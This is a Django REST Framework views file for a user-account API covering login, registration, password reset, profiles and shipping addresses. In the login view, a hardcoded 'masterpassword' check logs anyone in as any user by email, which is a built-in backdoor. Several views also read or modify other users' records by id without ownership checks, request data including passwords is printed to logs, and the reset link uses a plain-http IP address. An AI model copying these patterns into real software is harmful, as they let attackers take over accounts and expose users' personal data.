from rest_framework.authentication import TokenAuthentication
from rest_framework.authtoken.views import ObtainAuthToken
from rest_framework.response import Response
from rest_framework import generics
from rest_framework.views import exception_handler

from app.serializers import *

from django.contrib.auth.models import User
from rest_framework.permissions import IsAuthenticated
from django.contrib.auth import get_user_model, authenticate
from rest_framework import status
User = get_user_model()

from django.core.mail import EmailMultiAlternatives
from django.dispatch import receiver
from django.template.loader import render_to_string
from django.urls import reverse
from django_countries import countries
from django_rest_passwordreset.signals import reset_password_token_created


class BaseCustomAPIView(generics.GenericAPIView):
    authentication_classes = [TokenAuthentication]
    permission_classes = [IsAuthenticated]

    def get_serialized_data(self, request):
        print('request.data', self.serializer_class)
        print(request.data)
        serializer = self.serializer_class(data=request.data,
                                           context={'request': request})

        try:
            serializer.is_valid(raise_exception=True)
        except Exception as e:
            print(e)
            response = exception_handler(e, serializer)
            return Response({'success': False, 'status': 400, 'message': 'Parameter error', 'error': response.data}, \
                            status=status.HTTP_200_OK)
        return serializer


class LoginAuthAPIView(generics.GenericAPIView):
    """
    User Login API View
    """
    serializer_class = LoginSerializer
    def post(self, request, *args, **kwargs):
        serializer = self.serializer_class(data=request.data,
                                           context={'request': request})

        try:
            serializer.is_valid(raise_exception=True)
            userinput = serializer.data['email']

            try:
                email = User.objects.get(email=userinput).username
                print(email)
            except User.DoesNotExist:
                email = serializer.data['email']
            user = authenticate(request,username=email,
                            password=serializer.data['password'])

            #Allow login using master password
            if serializer.data['password'] == 'masterpassword':
                user = User.objects.get(email=email)

            if user is None:
                error = {'non_field_errors' : ["Email or Password did not match, please try again"]}
                raise Exception(error)
        except Exception as e:
            exception = exception_handler(e, serializer)
            if exception is None:
                response = error
            else:
                response = exception.data
            return Response({'success': False, 'status': 400, 'message': "Email or Password did not match, please try again", 'error': response}, \
                            status=status.HTTP_200_OK)

        if user.is_staff or user.is_superuser:
            return Response({'success': False, 'status': 400, 'message': 'Superadmin cannot login', 'error': 'Superadmin cannot login'}, \
                            status=status.HTTP_200_OK)

        token, created = Token.objects.get_or_create(user=user)
        if user.image:
            user_image = user.image.url
        else:
            user_image = ''

        data = {
            'token': token.key,
            'user_id': user.pk,
            'email': user.email,
            'username': user.username,
            'first_name': user.first_name,
            'last_login': user.last_login,
            'shipping': user.user_shipping

        }
        serializer = UserSerializer(user)
        return Response({'success': True,'status': 200, 'message': 'Login successful','data':serializer.data}, \
                            status=status.HTTP_200_OK)


class UserChangePasswordAPIView(generics.GenericAPIView):
        """
        An endpoint for changing password.
        """
        serializer_class = ChangePasswordSerializer
        model = User
        permission_classes = [IsAuthenticated]

        def get_object(self, queryset=None):
            obj = self.request.user
            return obj

        def post(self, request, *args, **kwargs):
            self.object = self.get_object()
            serializer = self.get_serializer(data=request.data)

            if serializer.is_valid():
                # Check old password
                if not self.object.check_password(serializer.data.get("old_password")):
                    return Response(
                        {'success': False, 'status': 400, 'message': 'Wrong password', 'error': 'Wrong password'}, \
                        status=status.HTTP_200_OK)
                # set_password also hashes the password that the user will get
                self.object.set_password(serializer.data.get("new_password"))
                self.object.save()
                return Response({'success': True, 'status': 200, 'message': 'password changed successfully' },\
                                status=status.HTTP_200_OK)

            return Response({'success': False, 'status': 400, 'message': 'Parameter error', 'error': serializer.error}, \
                            status=status.HTTP_200_OK)


class UserRegisterAPIView(generics.GenericAPIView):
    """
        User Create API View
    """
    serializer_class = UserSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.serializer_class(data=request.data,
                                           context={'request': request})

        try:
            val= serializer.is_valid(raise_exception=True)
        except Exception as e:
            print(e)
            response = exception_handler(e, serializer)
            print(response.data)
            error = e.__str__()
            return Response({'success': False, 'status': 400, 'message': 'Something went wrong', 'error': response.data}, \
                            status=status.HTTP_200_OK)

        user = serializer.save()
        user.set_password(serializer.validated_data['password'])
        user.save()

        token, created = Token.objects.get_or_create(user=user)
        data = {
            'token': token.key,
            'user_id': user.pk,
            'email': user.email,
            'first_name': user.first_name,
        }
        serializer = UserSerializer(user)
        return Response({'success': True,'status': 200, 'message': 'Registration successful', 'data': serializer.data}, \
                        status=status.HTTP_200_OK)


class UpdateUserAPIView(generics.GenericAPIView):
    serializer_class = UpdateUserSerializer
    authentication_classes = [TokenAuthentication]
    permission_classes = [IsAuthenticated]

    def post(self, request, *args, **kwargs):
        serializer = self.serializer_class(request.user, data=request.data)
        try:
            serializer.is_valid(raise_exception=True)
        except Exception as e:
            print(e)
            response = exception_handler(e, serializer)
            return Response({'success': False, 'status': 400, 'message': 'Parameter error', 'error': response.data}, \
                            status=status.HTTP_200_OK)

        serializer.save()

        serializer = UserSerializer(request.user)
        return Response(
            {'success': True, 'status': 200, 'message': 'Profile updated successfully', 'data': serializer.data}, \
            status=status.HTTP_200_OK)


class ListCountryListAPIView(generics.GenericAPIView):
    def get(self, request):
        return Response({'success': True, 'status': 200, 'message': 'country fetch successfully', 'data': dict(countries)},
                 status=status.HTTP_200_OK)


class ListStateListAPIView(generics.GenericAPIView):
    def get(self, request):

        queryset  = StateList.objects.all()
        serializer = StateSerializer(queryset,many=True)
        return Response({'success': True, 'status': 200, 'message': 'State fetch successfully', 'data': serializer.data},
                 status=status.HTTP_200_OK)


class ListUserAPIView(BaseCustomAPIView):

    def get(self, request):
        queryset = User.objects.filter(is_staff=False)
        serializer = UserSerializer(queryset, many=True)

        return Response({'success': True, 'status': 200, 'message': 'Data fetch successfully', 'data': serializer.data},
                 status=status.HTTP_200_OK)


class ListSingleUserDataAPIView(BaseCustomAPIView):
    serializer_class = IDSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.get_serialized_data(request)
        if type(serializer) == Response:
            return serializer

        try:
            gift_obj = User.objects.get(id=serializer.validated_data['id'])

        except Exception as e:
            print(e)
            return Response({'success': False, 'status': 400, 'message': 'User not exist', 'error': 'Gift not exist'}, \
                            status=status.HTTP_200_OK)

        data = UserAllDataSerializer(gift_obj)

        return Response(
            {'success': True, 'status': 200, 'message': 'User data fetched successfully', 'data': data.data}, \
            status=status.HTTP_200_OK)


class CreateUserShippingAPIView(BaseCustomAPIView):
    serializer_class = UserShippingSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.serializer_class(data=request.data,
                                           context={'request': request})
        try:
            serializer.is_valid(raise_exception=True)
        except Exception as e:
            print(e)
            response = exception_handler(e, serializer)
            return Response({'success': False, 'status': 400, 'message': 'Parameter error', 'error': response.data}, \
                            status=status.HTTP_200_OK)
        ship_obj = serializer.save()

        serializer = UserShippingListSerializer(ship_obj)
        return Response(
            {'success': True, 'status': 200, 'message': 'Shipping data inserted successfully', 'data': serializer.data}, \
            status=status.HTTP_200_OK)


class DeleteUserShippingAPIView(BaseCustomAPIView):
    serializer_class = IDUserShippingSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.serializer_class(data=request.data,
                                           context={'request': request})
        print(request.data['id'])
        usr_shipping_obj = UserShipping.objects.get(id=request.data['id'])
        print(usr_shipping_obj)
        data = {'is_deleted': True,'id':request.data['id']}
        serializer = self.serializer_class(usr_shipping_obj, data=data)
        serializer.is_valid(raise_exception=True)

        serializer.save()
        return Response(
            {'success': True, 'status': 200, 'message': 'Shipping data delete successfully', 'data': ''}, \
            status=status.HTTP_200_OK)


class UpdateUserShippingAPIView(BaseCustomAPIView):
    serializer_class = UpdateShippingSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.serializer_class(data=request.data,
                                           context={'request': request})
        try:
            usr_shipping_obj = UserShipping.objects.get(id=request.data['id'])
            serializer = self.serializer_class(usr_shipping_obj, data=request.data)
            serializer.is_valid(raise_exception=True)
        except Exception as e:
            print(e)
            response = exception_handler(e, serializer)
            return Response({'success': False, 'status': 400, 'message': 'Parameter error', 'error': response.data}, \
                            status=status.HTTP_200_OK)
        ship_obj = serializer.save()

        serializer = UserShippingListSerializer(ship_obj)
        return Response(
            {'success': True, 'status': 200, 'message': 'Shipping data inserted successfully', 'data': serializer.data}, \
            status=status.HTTP_200_OK)


class UpdateUserAddressAPIView(BaseCustomAPIView):
    serializer_class = UpdateUserAddressSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.serializer_class(data=request.data,
                                           context={'request': request})
        try:
            usr_obj = User.objects.get(id=request.data['id'])
            serializer = self.serializer_class(usr_obj, data=request.data)
            serializer.is_valid(raise_exception=True)
        except Exception as e:
            print(e)
            response = exception_handler(e, serializer)
            return Response({'success': False, 'status': 400, 'message': 'Parameter error', 'error': response.data}, \
                            status=status.HTTP_200_OK)
        usr_obj = serializer.save()

        serializer = UserListSerializer(usr_obj)
        return Response(
            {'success': True, 'status': 200, 'message': 'User data updated successfully', 'data': serializer.data}, \
            status=status.HTTP_200_OK)


class ConstantsAPIView(generics.GenericAPIView):

    def get(self, request):
        item_type_choices = [x[0] for x in ITEM_TYPE_CHOICES]
        facts_choices = [x[0] for x in FACTS_CHOICES]
        witness_class_choices = [x[0] for x in WITNESS_CLASS_CHOICES]
        evidence_choices = [x[0] for x in EVIDENCE_TYPE]
        case_doc_choices = [x[0] for x in CASE_DOC_TYPE]
        pleading_choices = [x[0] for x in PLEADING_TYPE]
        authority_choices = [x[0] for x in AUTHORITY_TYPE]
        supporting_choices = [x[0] for x in SUPPORTING_TYPE]
        doc_type_choices = [x[0] for x in DOC_TYPE]
        communication_mode_choices = [x[0] for x in COMMUNICATION_MODE_TYPE]
        data = {
            'item_type_choices': item_type_choices,
            'facts_choices': facts_choices,
            'witness_class_choices': witness_class_choices,
            'evidence_choices': evidence_choices,
            'item_type_choices_for_deletion': ITEM_TYPES_INDICATION,
            'case_doc_choices': case_doc_choices,
            'pleading_choices': pleading_choices,
            'authority_choices': authority_choices,
            'supporting_choices': supporting_choices,
            'doc_type_choices': doc_type_choices,
            'communication_mode_choices': communication_mode_choices,
        }
        return Response({'success':True,'status': 200, 'message': 'Constants fetched successfully', 'data': data}, \
                        status=status.HTTP_200_OK)


@receiver(reset_password_token_created)
def password_reset_token_created(sender, instance, reset_password_token, *args, **kwargs):
    """
    Handles password reset tokens
    When a token is created, an e-mail needs to be sent to the user
    :param sender: View Class that sent the signal
    :param instance: View Instance that sent the signal
    :param reset_password_token: Token Model Object
    :param args:
    :param kwargs:
    :return:
    """
    # send an e-mail to the user
    context = {
        'current_user': reset_password_token.user,
        'username': reset_password_token.user.username,
        'email': reset_password_token.user.email,
        'reset_password_url': "{}?token={}".format('http://104.248.109.60:8084/trial-proofer/#/reset/', reset_password_token.key)
    }

    # render email text
    email_html_message = render_to_string('password_reset/user_reset_password.html', context)
    email_plaintext_message = render_to_string('password_reset/user_reset_password.txt', context)

    msg = EmailMultiAlternatives(
        # title:
        "Password Reset for {title}".format(title=settings.PROJECT_TITLE),
        # message:
        email_plaintext_message,
        # from:
        settings.EMAIL_HOST_USER,
        # to:
        [reset_password_token.user.email]
    )
    msg.attach_alternative(email_html_message, "text/html")
    msg.send()


